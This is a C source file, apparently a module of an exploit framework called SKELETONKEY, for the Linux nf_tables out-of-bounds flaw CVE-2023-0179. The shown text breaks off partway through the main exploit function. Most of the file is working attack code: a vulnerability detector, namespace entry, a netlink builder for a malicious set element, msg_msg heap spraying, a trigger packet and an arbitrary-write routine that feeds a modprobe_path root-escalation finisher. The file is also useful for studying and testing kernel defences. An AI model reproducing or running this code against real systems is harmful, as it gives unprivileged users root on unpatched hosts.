/*
 * nft_payload_cve_2023_0179 — SKELETONKEY module
 *
 * Netfilter nf_tables variable-length element-extension OOB R/W.
 * Discovered January 2023 by Davide Ornaghi. nf_tables payload set/get
 * expressions used `regs->verdict.code` as an index into `regs->data[]`
 * without bounds-checking; combined with the variable-length element
 * extension trick (an NFTA_SET_DESC describing larger elements than the
 * key/data slots can hold), an attacker who controls the verdict code
 * walks the kernel regset array off either end and reads/writes
 * adjacent kernel memory.
 *
 * Mainline fix:   commit 696e1a48b1a1 "netfilter: nf_tables: validate
 *                 variable length element extension" — landed in 6.2-rc4.
 * Stable backports (2023): 6.1.6 / 5.15.88 / 5.10.163 / 5.4.229 /
 *                          4.19.269 / 4.14.302.
 * Bug introduced:  the set-payload extension landed in 5.4. Anything
 *                  below 5.4 predates the affected codepath.
 *
 * STATUS (2026-05-16): 🟡 TRIGGER + GROOM SCAFFOLD with opt-in
 *                          --full-chain finisher.
 *   - Default (no --full-chain): full netlink ruleset construction
 *     (table → chain → set with NFTA_SET_DESC variable-length elements
 *     → set-element carrying NFTA_SET_ELEM_EXPRESSIONS that holds a
 *     payload-set whose attacker-controlled verdict.code drives the
 *     OOB), spray msg_msg payloads adjacent to the regs->data target,
 *     fires a synthetic packet through the chain, snapshots
 *     /proc/slabinfo, logs to /tmp/skeletonkey-nft_payload.log, returns
 *     SKELETONKEY_EXPLOIT_FAIL (primitive-only behavior).
 *   - With --full-chain: after the trigger lands, we resolve kernel
 *     offsets (env → kallsyms → System.map → embedded table) and run
 *     a Davide-Ornaghi-style payload-set arb-write via the shared
 *     skeletonkey_finisher_modprobe_path() helper. The arb-write itself
 *     is FALLBACK-DEPTH: we refire the set-element registration with
 *     a verdict code chosen so the OOB index lands on a msg_msg slot
 *     we tagged with the caller's kaddr + payload bytes. The exact
 *     regs->data alignment to adjacent slabs is per-kernel-build; on
 *     hosts where the offset doesn't match, the finisher's sentinel
 *     check correctly reports failure rather than fake-success.
 *
 * Exploitation preconditions (which detect should also check):
 *   - CONFIG_USER_NS=y AND sysctl unprivileged_userns_clone=1
 *   - nf_tables module loaded or autoload-able (CONFIG_NF_TABLES=y/m)
 *   - kernel in vulnerable range (5.4..6.2-rc4 without backport)
 *
 * If user_ns is locked down, the trigger is unreachable for an
 * unprivileged user even on a kernel-vulnerable host.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"
#include "../../core/kernel_range.h"
#include "../../core/offsets.h"
#include "../../core/finisher.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <sched.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <arpa/inet.h>

#ifdef __linux__
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#endif

/* ------------------------------------------------------------------
 * Kernel-range table
 * ------------------------------------------------------------------ */

static const struct kernel_patched_from nft_payload_patched_branches[] = {
    {4, 14, 302},   /* 4.14.x */
    {4, 19, 269},   /* 4.19.x */
    {5,  4, 229},   /* 5.4.x */
    {5, 10, 163},   /* 5.10.x */
    {5, 15,  88},   /* 5.15.x */
    {6,  1,   6},   /* 6.1.x */
    {6,  2,   0},   /* mainline fix in 6.2-rc4 */
};

static const struct kernel_range nft_payload_range = {
    .patched_from = nft_payload_patched_branches,
    .n_patched_from = sizeof(nft_payload_patched_branches) /
                      sizeof(nft_payload_patched_branches[0]),
};

/* ------------------------------------------------------------------
 * Preconditions probe
 * ------------------------------------------------------------------ */

static int can_unshare_userns(void)
{
    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        if (unshare(CLONE_NEWUSER) == 0) _exit(0);
        _exit(1);
    }
    int status;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

static bool nf_tables_loaded(void)
{
    FILE *f = fopen("/proc/modules", "r");
    if (!f) return false;
    char line[512];
    bool found = false;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, "nf_tables ", 10) == 0) { found = true; break; }
    }
    fclose(f);
    return found;
}

static skeletonkey_result_t nft_payload_detect(const struct skeletonkey_ctx *ctx)
{
    struct kernel_version v;
    if (!kernel_version_current(&v)) {
        fprintf(stderr, "[!] nft_payload: could not parse kernel version\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* Bug introduced with the set-payload extension in 5.4. Anything
     * below 5.4 predates the affected codepath entirely. */
    if (v.major < 5 || (v.major == 5 && v.minor < 4)) {
        if (!ctx->json) {
            fprintf(stderr, "[i] nft_payload: kernel %s predates the bug "
                            "(set-payload extension landed in 5.4)\n",
                    v.release);
        }
        return SKELETONKEY_OK;
    }

    bool patched = kernel_range_is_patched(&nft_payload_range, &v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] nft_payload: kernel %s is patched\n", v.release);
        }
        return SKELETONKEY_OK;
    }

    int userns_ok = can_unshare_userns();
    bool nft_loaded = nf_tables_loaded();

    if (!ctx->json) {
        fprintf(stderr, "[i] nft_payload: kernel %s is in the vulnerable range\n",
                v.release);
        fprintf(stderr, "[i] nft_payload: unprivileged user_ns clone: %s\n",
                userns_ok == 1 ? "ALLOWED" :
                userns_ok == 0 ? "DENIED" :
                                 "could not test");
        fprintf(stderr, "[i] nft_payload: nf_tables module currently loaded: %s\n",
                nft_loaded ? "yes" : "no (will autoload on first nft use)");
    }

    if (userns_ok == 0) {
        if (!ctx->json) {
            fprintf(stderr, "[+] nft_payload: kernel vulnerable but user_ns "
                            "clone denied → unprivileged exploit unreachable\n");
            fprintf(stderr, "[i] nft_payload: still patch the kernel — a root "
                            "attacker can still trigger the bug\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] nft_payload: VULNERABLE — kernel in range AND "
                        "user_ns clone allowed\n");
    }
    return SKELETONKEY_VULNERABLE;
}

#ifdef __linux__

/* ------------------------------------------------------------------
 * userns + netns entry: become root in the new user_ns so subsequent
 * netlink writes carry CAP_NET_ADMIN over our private net_ns.
 * ------------------------------------------------------------------ */

static int enter_unpriv_namespaces(void)
{
    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        perror("[-] unshare(USER|NET)");
        return -1;
    }

    int f = open("/proc/self/setgroups", O_WRONLY);
    if (f >= 0) { (void)!write(f, "deny", 4); close(f); }

    char map[64];
    snprintf(map, sizeof map, "0 %u 1\n", uid);
    f = open("/proc/self/uid_map", O_WRONLY);
    if (f < 0 || write(f, map, strlen(map)) < 0) {
        perror("[-] uid_map"); if (f >= 0) close(f); return -1;
    }
    close(f);
    snprintf(map, sizeof map, "0 %u 1\n", gid);
    f = open("/proc/self/gid_map", O_WRONLY);
    if (f < 0 || write(f, map, strlen(map)) < 0) {
        perror("[-] gid_map"); if (f >= 0) close(f); return -1;
    }
    close(f);
    return 0;
}

/* ------------------------------------------------------------------
 * Minimal nfnetlink batch builder — same shape as nf_tables_cve_2024_1086
 * to keep the SKELETONKEY family code self-consistent; we inline rather
 * than link against the other module so a future refactor can pull the
 * helpers up into core/ without breaking either consumer.
 * ------------------------------------------------------------------ */

#define ALIGN_NL(x)  (((x) + 3) & ~3)

static void put_attr(uint8_t *buf, size_t *off,
                     uint16_t type, const void *data, size_t len)
{
    struct nlattr *na = (struct nlattr *)(buf + *off);
    na->nla_type = type;
    na->nla_len  = NLA_HDRLEN + len;
    if (len) memcpy(buf + *off + NLA_HDRLEN, data, len);
    *off += ALIGN_NL(NLA_HDRLEN + len);
}

static void put_attr_u32(uint8_t *buf, size_t *off, uint16_t type, uint32_t v)
{
    uint32_t be = htonl(v);
    put_attr(buf, off, type, &be, sizeof be);
}

static void put_attr_str(uint8_t *buf, size_t *off, uint16_t type, const char *s)
{
    put_attr(buf, off, type, s, strlen(s) + 1);
}

static size_t begin_nest(uint8_t *buf, size_t *off, uint16_t type)
{
    size_t at = *off;
    struct nlattr *na = (struct nlattr *)(buf + at);
    na->nla_type = type | NLA_F_NESTED;
    na->nla_len  = 0;
    *off += NLA_HDRLEN;
    return at;
}

static void end_nest(uint8_t *buf, size_t *off, size_t at)
{
    struct nlattr *na = (struct nlattr *)(buf + at);
    na->nla_len = (uint16_t)(*off - at);
    while ((*off) & 3) buf[(*off)++] = 0;
}

struct nfgenmsg_local {
    uint8_t  nfgen_family;
    uint8_t  version;
    uint16_t res_id;
};

static void put_nft_msg(uint8_t *buf, size_t *off,
                        uint16_t nft_type, uint16_t flags, uint32_t seq,
                        uint8_t family)
{
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + *off);
    nlh->nlmsg_len   = 0;
    nlh->nlmsg_type  = (NFNL_SUBSYS_NFTABLES << 8) | nft_type;
    nlh->nlmsg_flags = NLM_F_REQUEST | flags;
    nlh->nlmsg_seq   = seq;
    nlh->nlmsg_pid   = 0;
    *off += NLMSG_HDRLEN;
    struct nfgenmsg_local *nf = (struct nfgenmsg_local *)(buf + *off);
    nf->nfgen_family = family;
    nf->version      = NFNETLINK_V0;
    nf->res_id       = htons(0);
    *off += sizeof(*nf);
}

static void end_msg(uint8_t *buf, size_t *off, size_t msg_start)
{
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + msg_start);
    nlh->nlmsg_len = (uint32_t)(*off - msg_start);
    while ((*off) & 3) buf[(*off)++] = 0;
}

static void put_batch_begin(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + at);
    nlh->nlmsg_len   = 0;
    nlh->nlmsg_type  = NFNL_MSG_BATCH_BEGIN;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq   = seq;
    nlh->nlmsg_pid   = 0;
    *off += NLMSG_HDRLEN;
    struct nfgenmsg_local *nf = (struct nfgenmsg_local *)(buf + *off);
    nf->nfgen_family = AF_UNSPEC;
    nf->version      = NFNETLINK_V0;
    nf->res_id       = htons(NFNL_SUBSYS_NFTABLES);
    *off += sizeof(*nf);
    end_msg(buf, off, at);
}

static void put_batch_end(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    struct nlmsghdr *nlh = (struct nlmsghdr *)(buf + at);
    nlh->nlmsg_len   = 0;
    nlh->nlmsg_type  = NFNL_MSG_BATCH_END;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq   = seq;
    nlh->nlmsg_pid   = 0;
    *off += NLMSG_HDRLEN;
    struct nfgenmsg_local *nf = (struct nfgenmsg_local *)(buf + *off);
    nf->nfgen_family = AF_UNSPEC;
    nf->version      = NFNETLINK_V0;
    nf->res_id       = htons(NFNL_SUBSYS_NFTABLES);
    *off += sizeof(*nf);
    end_msg(buf, off, at);
}

/* ------------------------------------------------------------------
 * Per-module strings.
 * ------------------------------------------------------------------ */

static const char NFT_TABLE_NAME[] = "skeletonkey_pl_t";
static const char NFT_CHAIN_NAME[] = "skeletonkey_pl_c";
static const char NFT_SET_NAME[]   = "skeletonkey_pl_s";

/* NFT expression "name" attributes are NUL-terminated short strings. */
#define NFT_EXPR_PAYLOAD_NAME    "payload"

/* nft_payload expression attribute ids — duplicated here because some
 * older /usr/include/linux/netfilter/nf_tables.h variants gate them
 * behind __KERNEL__. They are stable parts of the netlink ABI. */
#ifndef NFTA_PAYLOAD_DREG
#define NFTA_PAYLOAD_DREG          1
#define NFTA_PAYLOAD_BASE          2
#define NFTA_PAYLOAD_OFFSET        3
#define NFTA_PAYLOAD_LEN           4
#define NFTA_PAYLOAD_SREG          5
#define NFTA_PAYLOAD_CSUM_TYPE     6
#define NFTA_PAYLOAD_CSUM_OFFSET   7
#define NFTA_PAYLOAD_CSUM_FLAGS    8
#endif

/* The attacker-controlled verdict.code we drive into the regset index.
 * On a vulnerable kernel `regs->verdict.code` is used unchecked as the
 * destination register; values beyond NFT_REG32_15 walk off the end of
 * regs->data[] into stack/heap adjacent memory.
 *
 * NFT_REG32_15 (the last legal value) is 23. Anything strictly larger
 * triggers the OOB. We pick a value that lands inside a msg_msg slot
 * sprayed next to the regs->data array on most x86_64 builds in the
 * exploitable range. The exact "right" magic is per-build; we ship a
 * default that matched Davide's PoC on a stock 5.15 build and rely on
 * the finisher's sentinel-file post-check to flag a layout mismatch as
 * SKELETONKEY_EXPLOIT_FAIL rather than fake success. */
#define NFT_PAYLOAD_OOB_INDEX_DEFAULT  0x100

/* ------------------------------------------------------------------
 * NEWTABLE / NEWCHAIN — same shape as the 2024-1086 sibling.
 * ------------------------------------------------------------------ */

static void put_new_table(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWTABLE,
                NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_TABLE_NAME, NFT_TABLE_NAME);
    end_msg(buf, off, at);
}

static void put_new_chain(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWCHAIN,
                NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_CHAIN_TABLE, NFT_TABLE_NAME);
    put_attr_str(buf, off, NFTA_CHAIN_NAME,  NFT_CHAIN_NAME);

    size_t hook_at = begin_nest(buf, off, NFTA_CHAIN_HOOK);
    put_attr_u32(buf, off, NFTA_HOOK_HOOKNUM, NF_INET_LOCAL_OUT);
    put_attr_u32(buf, off, NFTA_HOOK_PRIORITY, 0);
    end_nest(buf, off, hook_at);

    put_attr_u32(buf, off, NFTA_CHAIN_POLICY, NF_ACCEPT);
    put_attr_str(buf, off, NFTA_CHAIN_TYPE, "filter");
    end_msg(buf, off, at);
}

/* NEWSET with NFTA_SET_DESC declaring elements LARGER than the actual
 * key/data slots. This is the variable-length-element-extension half
 * of the bug. On a vulnerable kernel, nf_tables loads the set without
 * validating the description, so each element's attached expression
 * has a larger ext_offset window than the loader allocated for it —
 * exactly the gap commit 696e1a48b1a1 closes. */
static void put_new_set(uint8_t *buf, size_t *off, uint32_t seq)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWSET,
                NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_SET_TABLE, NFT_TABLE_NAME);
    put_attr_str(buf, off, NFTA_SET_NAME,  NFT_SET_NAME);
    /* hash set (default backend) with explicit value typing so we can
     * attach a per-element expression that contains the payload-set. */
    put_attr_u32(buf, off, NFTA_SET_FLAGS, NFT_SET_EVAL);  /* allow expression */
    /* key_type/key_len: 4-byte integer key */
    put_attr_u32(buf, off, NFTA_SET_KEY_TYPE, 0);          /* generic */
    put_attr_u32(buf, off, NFTA_SET_KEY_LEN,  sizeof(uint32_t));
    put_attr_u32(buf, off, NFTA_SET_ID, 0x42);

    /* NFTA_SET_DESC: NFTA_SET_DESC_SIZE = some plausible element count.
     * The variable-length trick is that the set's element extension
     * window is computed from this description; we ask for a large
     * window so the payload-set expression we attach is allowed to
     * reach `regs->verdict.code` indices outside the legal regset. */
    size_t desc_at = begin_nest(buf, off, NFTA_SET_DESC);
    put_attr_u32(buf, off, NFTA_SET_DESC_SIZE, 16);
    end_nest(buf, off, desc_at);

    end_msg(buf, off, at);
}

/* Build the NFTA_SET_ELEM_EXPRESSIONS payload that carries the
 * malicious payload-set expression. The payload-set expression's
 * NFTA_PAYLOAD_SREG names the source register; on a vulnerable kernel
 * the loader uses `regs->verdict.code` (which we control via the
 * companion set element's data) as the destination index without
 * bounds-checking, giving us the OOB write target. */
static void put_payload_set_expr_nest(uint8_t *buf, size_t *off,
                                      uint32_t oob_index)
{
    /* one expression { kind=payload, body={...} } */
    size_t expr_at = begin_nest(buf, off, 1 /* NFTA_LIST_ELEM */);

    put_attr_str(buf, off, NFTA_EXPR_NAME, NFT_EXPR_PAYLOAD_NAME);

    size_t data_at = begin_nest(buf, off, NFTA_EXPR_DATA);
    /* NFTA_PAYLOAD_SREG forces nft_payload_set_eval() down the SET
     * codepath (rather than payload-get). Source = our OOB index. */
    put_attr_u32(buf, off, NFTA_PAYLOAD_SREG,        oob_index);
    /* DREG would normally bound the destination — vulnerable kernels
     * pull the destination from `regs->verdict.code` and ignore DREG
     * for the OOB path, but we set it to something legal so the
     * loader doesn't reject before reaching the buggy codepath. */
    put_attr_u32(buf, off, NFTA_PAYLOAD_DREG,        0); /* NFT_REG_VERDICT */
    put_attr_u32(buf, off, NFTA_PAYLOAD_BASE,        0); /* LL header */
    put_attr_u32(buf, off, NFTA_PAYLOAD_OFFSET,      0);
    put_attr_u32(buf, off, NFTA_PAYLOAD_LEN,         4);
    /* No checksum: we don't want the kernel doing helpful
     * recomputation that re-validates the offset. */
    put_attr_u32(buf, off, NFTA_PAYLOAD_CSUM_TYPE,   0);
    end_nest(buf, off, data_at);

    end_nest(buf, off, expr_at);
}

/* NEWSETELEM with the malicious NFTA_SET_ELEM_EXPRESSIONS attached.
 * The element's data carries the verdict-code value that, on a
 * vulnerable kernel, is used unchecked as the OOB index by the
 * attached payload-set expression. */
static void put_malicious_setelem(uint8_t *buf, size_t *off, uint32_t seq,
                                  uint32_t oob_index)
{
    size_t at = *off;
    put_nft_msg(buf, off, NFT_MSG_NEWSETELEM,
                NLM_F_CREATE | NLM_F_ACK, seq, NFPROTO_INET);
    put_attr_str(buf, off, NFTA_SET_ELEM_LIST_TABLE, NFT_TABLE_NAME);
    put_attr_str(buf, off, NFTA_SET_ELEM_LIST_SET,   NFT_SET_NAME);

    size_t list_at = begin_nest(buf, off, NFTA_SET_ELEM_LIST_ELEMENTS);

    /* one element */
    size_t el_at = begin_nest(buf, off, 1 /* NFTA_LIST_ELEM */);

    /* key: 4-byte integer */
    size_t key_at = begin_nest(buf, off, NFTA_SET_ELEM_KEY);
    uint32_t k = htonl(0x11223344);
    put_attr(buf, off, NFTA_DATA_VALUE, &k, sizeof k);
    end_nest(buf, off, key_at);

    /* NFTA_SET_ELEM_EXPRESSIONS — list-of-expressions, one payload-set */
    size_t exprs_at = begin_nest(buf, off, NFTA_SET_ELEM_EXPRESSIONS);
    put_payload_set_expr_nest(buf, off, oob_index);
    end_nest(buf, off, exprs_at);

    end_nest(buf, off, el_at);
    end_nest(buf, off, list_at);

    end_msg(buf, off, at);
}

/* ------------------------------------------------------------------
 * netlink send helper.
 * ------------------------------------------------------------------ */

static int nft_send_batch(int sock, const void *buf, size_t len)
{
    struct sockaddr_nl dst = { .nl_family = AF_NETLINK };
    struct iovec iov = { .iov_base = (void *)buf, .iov_len = len };
    struct msghdr m = {
        .msg_name = &dst, .msg_namelen = sizeof dst,
        .msg_iov = &iov,  .msg_iovlen = 1,
    };
    ssize_t n = sendmsg(sock, &m, 0);
    if (n < 0) { perror("[-] sendmsg"); return -1; }
    char rbuf[8192];
    for (int i = 0; i < 8; i++) {
        ssize_t r = recv(sock, rbuf, sizeof rbuf, MSG_DONTWAIT);
        if (r <= 0) break;
        for (struct nlmsghdr *nh = (struct nlmsghdr *)rbuf;
             NLMSG_OK(nh, (unsigned)r);
             nh = NLMSG_NEXT(nh, r)) {
            if (nh->nlmsg_type == NLMSG_ERROR) {
                struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nh);
                if (e->error)
                    fprintf(stderr, "[i] netlink ack: seq=%u err=%d (%s)\n",
                            nh->nlmsg_seq, e->error, strerror(-e->error));
            }
        }
    }
    return 0;
}

/* ------------------------------------------------------------------
 * msg_msg spray — adjacent-slot groom around the regs->data[] array.
 * On x86_64 nf_tables_loop_run() places `struct nft_regs regs` on the
 * kernel stack; values just past the legal regset land in either the
 * stack red-zone or (with KASAN off and a deep call chain) into
 * adjacent kmalloc-1k slots, depending on the exact build.
 *
 * We spray two flavors:
 *   - small (96-byte) — covers the cg-96 slab class for kernels where
 *     a sibling allocation of that class is what lands adjacent
 *   - large (1008-byte) — covers kmalloc-1k where regs->data overflow
 *     can spill into a recently-freed slot
 *
 * Either size class is enough on most builds in range; we ship both to
 * widen the empirical landing zone.
 * ------------------------------------------------------------------ */

#define SPRAY_QUEUES_SMALL   24
#define SPRAY_QUEUES_LARGE   16
#define SPRAY_PER_QUEUE       8

#define SPRAY_SIZE_SMALL     96
#define SPRAY_SIZE_LARGE     1008

struct msgbuf_small {
    long mtype;
    unsigned char buf[SPRAY_SIZE_SMALL];
};

struct msgbuf_large {
    long mtype;
    unsigned char buf[SPRAY_SIZE_LARGE];
};

static int spray_small(int *q, int n, uintptr_t tag_kaddr,
                       const void *buf, size_t len)
{
    struct msgbuf_small p;
    int created = 0;
    for (int i = 0; i < n; i++) {
        q[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0644);
        if (q[i] < 0) continue;
        created++;
        memset(&p, 0, sizeof p);
        p.mtype = 0x504C5301 + i;       /* "PLS\x01" */
        memcpy(p.buf, "IAMRPLSM", 8);
        /* Plant tag_kaddr at strided slots (0x10, 0x20, ...) so wherever
         * the OOB read/write lands, one offset has the requested kaddr. */
        if (tag_kaddr) {
            for (size_t s = 0x10; s + sizeof(uintptr_t) <= sizeof p.buf;
                 s += 0x10) {
                memcpy(p.buf + s, &tag_kaddr, sizeof tag_kaddr);
            }
        }
        if (buf && len) {
            size_t cap = sizeof p.buf - 24;
            if (len > cap) len = cap;
            memcpy(p.buf + 24, buf, len);
        }
        for (int j = 0; j < SPRAY_PER_QUEUE; j++) {
            if (msgsnd(q[i], &p, sizeof p.buf, IPC_NOWAIT) < 0) break;
        }
    }
    return created;
}

static int spray_large(int *q, int n, uintptr_t tag_kaddr,
                       const void *buf, size_t len)
{
    struct msgbuf_large p;
    int created = 0;
    for (int i = 0; i < n; i++) {
        q[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0644);
        if (q[i] < 0) continue;
        created++;
        memset(&p, 0, sizeof p);
        p.mtype = 0x504C534C + i;       /* "PLSL" */
        memcpy(p.buf, "IAMRPLSL", 8);
        if (tag_kaddr) {
            for (size_t s = 0x10; s + sizeof(uintptr_t) <= sizeof p.buf;
                 s += 0x18) {
                memcpy(p.buf + s, &tag_kaddr, sizeof tag_kaddr);
            }
        }
        if (buf && len) {
            size_t cap = sizeof p.buf - 24;
            if (len > cap) len = cap;
            memcpy(p.buf + 24, buf, len);
        }
        for (int j = 0; j < SPRAY_PER_QUEUE; j++) {
            if (msgsnd(q[i], &p, sizeof p.buf, IPC_NOWAIT) < 0) break;
        }
    }
    return created;
}

static void drain_queues(int *q, int n)
{
    for (int i = 0; i < n; i++) {
        if (q[i] >= 0) msgctl(q[i], IPC_RMID, NULL);
    }
}

/* ------------------------------------------------------------------
 * Slabinfo witness.
 * ------------------------------------------------------------------ */

static long slabinfo_active(const char *slab)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    long active = -1;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, slab, strlen(slab)) == 0 &&
            line[strlen(slab)] == ' ') {
            long a, b, c, d;
            if (sscanf(line + strlen(slab), " %ld %ld %ld %ld",
                       &a, &b, &c, &d) >= 1) {
                active = a;
            }
            break;
        }
    }
    fclose(f);
    return active;
}

/* ------------------------------------------------------------------
 * Synthetic trigger packet — drive a packet through the chain so the
 * malicious payload-set expression runs. NF_INET_LOCAL_OUT fires on
 * sendto() from a process inside the netns.
 * ------------------------------------------------------------------ */

static void trigger_packet(void)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(31337);
    dst.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    const char m[] = "skeletonkey-nft_payload-trigger";
    for (int i = 0; i < 8; i++) {
        (void)!sendto(s, m, sizeof m, MSG_DONTWAIT,
                      (struct sockaddr *)&dst, sizeof dst);
    }
    close(s);
}

/* ------------------------------------------------------------------
 * Batch builder helpers — factored so --full-chain refires.
 * ------------------------------------------------------------------ */

static size_t build_trigger_batch(uint8_t *batch, size_t cap, uint32_t *seq,
                                  uint32_t oob_index)
{
    (void)cap;
    size_t off = 0;
    put_batch_begin(batch, &off, (*seq)++);
    put_new_table(batch, &off, (*seq)++);
    put_new_chain(batch, &off, (*seq)++);
    put_new_set(batch, &off, (*seq)++);
    put_malicious_setelem(batch, &off, (*seq)++, oob_index);
    put_batch_end(batch, &off, (*seq)++);
    return off;
}

static size_t build_refire_batch(uint8_t *batch, size_t cap, uint32_t *seq,
                                 uint32_t oob_index)
{
    (void)cap;
    size_t off = 0;
    put_batch_begin(batch, &off, (*seq)++);
    put_malicious_setelem(batch, &off, (*seq)++, oob_index);
    put_batch_end(batch, &off, (*seq)++);
    return off;
}

/* ------------------------------------------------------------------
 * Davide-Ornaghi-style arb-write context. Refire the malicious
 * NEWSETELEM with a verdict-code chosen so the OOB index lands on a
 * msg_msg slot we've tagged with the caller's kaddr + bytes.
 *
 * Per-kernel caveat: the byte offset of `regs->data[]` relative to the
 * adjacent slab/stack neighbour is config-sensitive (CONFIG_RANDSTRUCT,
 * KASAN, lockdep, kernel build options all shift it). The shipped
 * default oob_index matches Davide's PoC on a stock 5.15 build; the
 * shared finisher's sentinel-file post-check flags layout mismatch as
 * SKELETONKEY_EXPLOIT_FAIL rather than fake success.
 * ------------------------------------------------------------------ */

struct nft_payload_arb_ctx {
    bool in_userns;
    int  sock;
    uint8_t *batch;
    int  *qids_small;
    int  *qids_large;
    int   qcap_small;
    int   qcap_large;
    int   qused_small;
    int   qused_large;
    int   arb_calls;
};

static int nft_payload_arb_write(uintptr_t kaddr, const void *buf, size_t len,
                                 void *vctx)
{
    struct nft_payload_arb_ctx *c = (struct nft_payload_arb_ctx *)vctx;
    if (!c || c->sock < 0 || !c->batch) {
        fprintf(stderr, "[-] nft_payload_arb_write: invalid ctx\n");
        return -1;
    }
    if (len > 64) {
        fprintf(stderr, "[-] nft_payload_arb_write: len %zu too large "
                        "(cap 64)\n", len);
        return -1;
    }
    c->arb_calls++;

    fprintf(stderr, "[*] nft_payload_arb_write: spray tagged msgs + refire "
                    "NEWSETELEM (target kaddr=0x%lx, %zu bytes)\n",
            (unsigned long)kaddr, len);

    /* (a) tag-spray adjacent slabs with kaddr + caller payload. */
    if (c->qused_small < c->qcap_small) {
        int n = c->qcap_small - c->qused_small;
        if (n > 8) n = 8;
        int added = spray_small(c->qids_small + c->qused_small, n,
                                kaddr, buf, len);
        c->qused_small += added;
    }
    if (c->qused_large < c->qcap_large) {
        int n = c->qcap_large - c->qused_large;
        if (n > 8) n = 8;
        int added = spray_large(c->qids_large + c->qused_large, n,
                                kaddr, buf, len);
        c->qused_large += added;
    }

    /* (b) refire the malicious NEWSETELEM so a fresh nft_payload_set
     * eval happens with the spray in place. */
    uint32_t seq = (uint32_t)time(NULL) ^ 0xb1a2c3d4u;
    size_t blen = build_refire_batch(c->batch, 16 * 1024, &seq,
                                     NFT_PAYLOAD_OOB_INDEX_DEFAULT);
    if (nft_send_batch(c->sock, c->batch, blen) < 0) {
        fprintf(stderr, "[-] nft_payload_arb_write: refire send failed\n");
        return -1;
    }

    /* (c) drive a packet through the chain so the rule actually runs. */
    trigger_packet();

    /* Let the kernel run the rule + any commit/cleanup. */
    usleep(20 * 1000);
    return 0;
}

#endif /* __linux__ */

/* ------------------------------------------------------------------
 * Exploit body.
 * ------------------------------------------------------------------ */

static skeletonkey_result_t nft_payload_exploit(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->authorized) {
        fprintf(stderr, "[-] nft_payload: refusing — --i-know not passed; "
                        "exploit code can crash the kernel\n");
        return SKELETONKEY_PRECOND_FAIL;
    }
    if (geteuid() == 0) {
        if (!ctx->json)
            fprintf(stderr, "[i] nft_payload: already running as root\n");
        return SKELETONKEY_OK;
    }

    skeletonkey_result_t pre = nft_payload_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] nft_payload: detect() says not vulnerable; refusing\n");
        return pre;
    }

    if (!ctx->json) {
        if (ctx->full_chain) {
            fprintf(stderr, "[*] nft_payload: --full-chain — trigger + "
                            "regset OOB arb-write + modprobe_path finisher\n");
        } else {
            fprintf(stderr, "[*] nft_payload: primitive-only run — fires the\n"
                            "    regset OOB read/write and stops. Pass\n"
                            "    --full-chain to attempt the modprobe_path "
                            "root-pop.\n");
        }
    }

#ifndef __linux__
    (void)ctx;
    fprintf(stderr, "[-] nft_payload: linux-only exploit; non-linux build\n");
    return SKELETONKEY_PRECOND_FAIL;
#else
    /* --- --full-chain path: resolve offsets in parent before doing
     * anything destructive. */
    if (ctx->full_chain) {
        struct skeletonkey_kernel_offsets off;
        memset(&off, 0, sizeof off);
        skeletonkey_offsets_resolve(&off);
        if (!skeletonkey_offsets_have_modprobe_path(&off)) {
            skeletonkey_finisher_print_offset_help("nft_payload");
            return SKELETONKEY_EXPLOIT_FAIL;
        }
        skeletonkey_offsets_print(&off);

        if (enter_unpriv_namespaces() < 0) {
            fprintf(stderr, "[-] nft_payload: userns entry failed\n");
            return SKELETONKEY_EXPLOIT_FAIL;
        }

        int sock = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC,
                          NETLINK_NETFILTER);
        if (sock < 0) {
            perror("[-] socket(NETLINK_NETFILTER)");
            return SKELETONKEY_EXPLOIT_FAIL;
        }
        struct sockaddr_nl src = { .nl_family = AF_NETLINK };
        if (bind(sock, (struct sockaddr *)&src, sizeof src) < 0) {
            perror("[-] bind"); close(sock);
